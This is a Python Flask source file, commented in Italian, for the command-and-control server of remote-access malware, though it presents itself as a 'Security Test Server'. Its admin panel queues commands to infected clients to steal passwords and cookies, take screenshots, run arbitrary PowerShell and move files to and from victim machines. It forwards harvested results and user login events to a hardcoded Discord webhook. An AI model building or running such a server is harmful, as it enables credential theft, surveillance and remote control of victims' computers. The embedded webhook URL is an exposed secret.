from flask import Flask, request, jsonify, send_file
import threading
import time
import json
import requests
from datetime import datetime
import os
import hashlib

app = Flask(__name__)

# Configurazione Discord
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"  # ⚠️ SOSTITUISCI CON IL TUO WEBHOOK
CURRENT_VERSION = "2.0.0"  # Versione semplificata

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.next_client_id = 1
        self.lock = threading.Lock()
        self.commands_queue = {}
        self.client_fingerprints = {}
    
    def generate_fingerprint(self, client_data, ip_address):
        fingerprint_str = f"{client_data.get('hostname','')}{ip_address}{client_data.get('username','')}"
        return hashlib.md5(fingerprint_str.encode()).hexdigest()
    
    def add_client(self, client_data, ip_address):
        with self.lock:
            fingerprint = self.generate_fingerprint(client_data, ip_address)
            
            if fingerprint in self.client_fingerprints:
                client_id = self.client_fingerprints[fingerprint]
                self.clients[client_id] = {
                    "data": client_data,
                    "last_seen": datetime.now(),
                    "ip": ip_address,
                    "fingerprint": fingerprint,
                    "public_ip": client_data.get('public_ip', 'unknown')
                }
                return client_id
            else:
                client_id = self.next_client_id
                self.clients[client_id] = {
                    "data": client_data,
                    "last_seen": datetime.now(),
                    "ip": ip_address,
                    "fingerprint": fingerprint,
                    "public_ip": client_data.get('public_ip', 'unknown')
                }
                self.client_fingerprints[fingerprint] = client_id
                self.next_client_id += 1
                return client_id
    
    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                fingerprint = self.clients[client_id].get("fingerprint")
                if fingerprint in self.client_fingerprints:
                    del self.client_fingerprints[fingerprint]
                del self.clients[client_id]
                if client_id in self.commands_queue:
                    del self.commands_queue[client_id]
    
    def get_client(self, client_id):
        with self.lock:
            return self.clients.get(client_id)
    
    def list_clients(self):
        with self.lock:
            return self.clients.copy()
    
    def add_command(self, client_id, command):
        with self.lock:
            if client_id not in self.commands_queue:
                self.commands_queue[client_id] = []
            self.commands_queue[client_id].append(command)
    
    def get_command(self, client_id):
        with self.lock:
            if client_id in self.commands_queue and self.commands_queue[client_id]:
                return self.commands_queue[client_id].pop(0)
            return None

client_manager = ClientManager()

def send_to_discord(message, data_type="SERVER"):
    if not DISCORD_WEBHOOK:
        return False
    
    try:
        payload = {
            "content": f"🔐 **[{data_type}]** {message}",
            "username": "SecurityBot",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/6001/6001368.png"
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(DISCORD_WEBHOOK, json=payload, headers=headers, timeout=10)
        return response.status_code == 204
    except Exception as e:
        print(f"Discord error: {e}")
        return False

@app.route('/')
def home():
    clients_count = len(client_manager.list_clients())
    return f"""
    <h1>Security Test Server v{CURRENT_VERSION}</h1>
    <p>PythonAnywhere - Versione Semplificata</p>
    <p>Client connessi: {clients_count}</p>
    <p><a href="/admin">Admin Panel</a></p>
    <p><a href="/api/clients">API Clients (JSON)</a></p>
    """

@app.route('/admin')
def admin_panel():
    clients = client_manager.list_clients()
    clients_html = ""
    for client_id, info in clients.items():
        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")} (IP: {info.get("public_ip", "unknown")})</option>'
    
    return f'''
    <h2>Admin Control Panel v{CURRENT_VERSION}</h2>
    
    <h3>📋 Comandi Predefiniti</h3>
    <form action="/send_command" method="post">
    <label>Select Client:</label>
    <select name="client_id">
    {clients_html}
    </select><br><br>
    
    <label>Command:</label>
    <select name="command">
    <option value="passwords">Get Passwords</option>
    <option value="cookies">Get Cookies</option>
    <option value="systeminfo">System Info</option>
    <option value="screenshot">Take Screenshot</option>
    </select><br><br>
    
    <button type="submit">Send Command</button>
    </form>
    
    <h3>⚡ PowerShell Live</h3>
    <form action="/send_powershell" method="post">
    <label>Client:</label>
    <select name="client_id">
    {clients_html}
    </select><br><br>
    
    <label>PowerShell Command:</label><br>
    <textarea name="powershell_command" rows="3" cols="50" placeholder="Enter any PowerShell command..."></textarea><br><br>
    
    <button type="submit">Execute PowerShell</button>
    </form>
    
    <h3>📁 File Operations</h3>
    
    <h4>📥 Download File from Client</h4>
    <form action="/download_file" method="post">
    <label>Client:</label>
    <select name="client_id">
    {clients_html}
    </select><br>
    
    <label>File Path:</label>
    <input type="text" name="file_path" placeholder="C:\\path\\to\\file.txt" style="width: 300px;"><br><br>
    
    <button type="submit">Download File</button>
    </form>
    
    <h4>📤 Upload File to Client</h4>
    <form action="/send_upload_command" method="post">
    <label>Client:</label>
    <select name="client_id">
    {clients_html}
    </select><br>
    
    <label>File Path on Server:</label>
    <input type="text" name="filename" placeholder="file.txt" style="width: 200px;"><br>
    
    <label>Destination on Client:</label>
    <input type="text" name="destination" value="C:\\Temp\\" style="width: 300px;"><br><br>
    
    <button type="submit">Upload to Client</button>
    </form>
    
    <p><a href="/">Back to Home</a></p>
    '''

@app.route('/send_command', methods=['POST'])
def send_command_web():
    client_id = request.form.get('client_id')
    command = request.form.get('command')
    
    if client_id and command:
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"🌐 Comando web '{command}' per client {client_id}")
    
    return f'''
    <h3>Command Sent!</h3>
    <p>Command: {command} to Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/send_powershell', methods=['POST'])
def send_powershell():
    client_id = request.form.get('client_id')
    powershell_command = request.form.get('powershell_command')
    
    if client_id and powershell_command:
        command = f"powershell_live:{powershell_command}"
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"⚡ PowerShell: {powershell_command[:100]}... per client {client_id}")
    
    return f'''
    <h3>PowerShell Command Sent!</h3>
    <p>Command: {powershell_command}</p>
    <p>To Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/download_file', methods=['POST'])
def download_file():
    client_id = request.form.get('client_id')
    file_path = request.form.get('file_path')
    
    if client_id and file_path:
        command = f"download_file:{file_path}"
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"📥 Download richiesto: {file_path} da client {client_id}")
    
    return f'''
    <h3>Download Request Sent!</h3>
    <p>File: {file_path}</p>
    <p>From Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/send_upload_command', methods=['POST'])
def send_upload_command():
    client_id = request.form.get('client_id')
    filename = request.form.get('filename')
    destination = request.form.get('destination')
    
    if client_id and filename and destination:
        command = f"upload_file|{filename}|{destination}"
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"📤 Upload richiesto: {filename} → {destination} su client {client_id}")
    
    return f'''
    <h3>Upload Command Sent!</h3>
    <p>File: {filename}</p>
    <p>Destination: {destination}</p>
    <p>To Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/api/register', methods=['POST'])
def register_client():
    try:
        client_data = request.json
        client_ip = request.remote_addr
        client_id = client_manager.add_client(client_data, client_ip)
        
        public_ip = client_data.get('public_ip', 'unknown')
        send_to_discord(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')} - IP: {public_ip}")
        
        return jsonify({
            "status": "success",
            "client_id": client_id,
            "message": "Client registered successfully"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/check_commands', methods=['GET'])
def check_commands():
    try:
        client_id = request.args.get('client_id')
        
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"})
        
        command = client_manager.get_command(int(client_id))
        
        return jsonify({
            "status": "success",
            "command": command,
            "message": "Command check completed"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/results', methods=['POST'])
def receive_results():
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        results = data.get('results')
        
        results_preview = str(results)[:1500]
        send_to_discord(f"📊 Risultati da client {client_id} - {command}:\n```{results_preview}```")
        
        filename = f"results_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        return jsonify({"status": "success", "message": "Results received"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/clients', methods=['GET'])
def list_clients():
    clients = client_manager.list_clients()
    return jsonify({
        "status": "success",
        "clients": {
            cid: {
                "data": info["data"],
                "last_seen": info["last_seen"].isoformat(),
                "ip": info["ip"],
                "public_ip": info.get("public_ip", "unknown")
            } for cid, info in clients.items()
        }
    })

@app.route('/api/available_files', methods=['GET'])
def available_files():
    try:
        files_dir = "uploads"
        available = []
        if os.path.exists(files_dir):
            for filename in os.listdir(files_dir):
                file_path = os.path.join(files_dir, filename)
                if os.path.isfile(file_path):
                    available.append({
                        "name": filename,
                        "size": os.path.getsize(file_path),
                        "modified": os.path.getmtime(file_path)
                    })
        return jsonify({"status": "success", "files": available})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/user_event', methods=['POST'])
def user_event():
    """Riceve eventi login/logout utenti"""
    try:
        data = request.json
        event_type = data.get('event_type', 'unknown')
        username = data.get('username', 'unknown')
        session_id = data.get('session_id', '')
        hostname = data.get('hostname', '')
        
        message = f"👤 {event_type.upper()}: {username}"
        if hostname:
            message += f" su {hostname}"
        if session_id:
            message += f" (sessione: {session_id})"
        
        send_to_discord(message)
        
        # Salva in log file
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'event': event_type,
            'username': username,
            'session_id': session_id,
            'hostname': hostname
        }
        
        with open('user_sessions.log', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/download_file/<filename>', methods=['GET'])
def download_file_server(filename):
    try:
        safe_filename = os.path.basename(filename)
        return send_file(f"uploads/{safe_filename}", as_attachment=True)
    except:
        return jsonify({"status": "error", "message": "File not found"})

@app.route('/api/upload_file', methods=['POST'])
def upload_file():
    try:
        client_id = request.form.get('client_id')
        file_path = request.form.get('file_path')
        
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file uploaded"})
        
        file = request.files['file']
        safe_filename = os.path.basename(file_path) if file_path else f"upload_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.dat"
        
        uploads_dir = "uploads"
        os.makedirs(uploads_dir, exist_ok=True)
        
        file.save(os.path.join(uploads_dir, safe_filename))
        
        send_to_discord(f"📤 File uploadato da client {client_id}: {safe_filename}")
        
        return jsonify({"status": "success", "message": f"File {safe_filename} uploaded"})
    
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/check_update', methods=['GET'])
def check_update():
    client_version = request.args.get('version', '1.0.0')
    
    if client_version != CURRENT_VERSION:
        return jsonify({
            "status": "update_available",
            "current_version": CURRENT_VERSION,
            "message": "New version available"
        })
    else:
        return jsonify({
            "status": "up_to_date",
            "message": "Client is up to date"
        })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    os.makedirs("uploads", exist_ok=True)
    os.makedirs("downloads", exist_ok=True)
    
    send_to_discord(f"🚀 Server v{CURRENT_VERSION} (Semplificato) avviato su PythonAnywhere")
    app.run(host='0.0.0.0', port=port, debug=False)
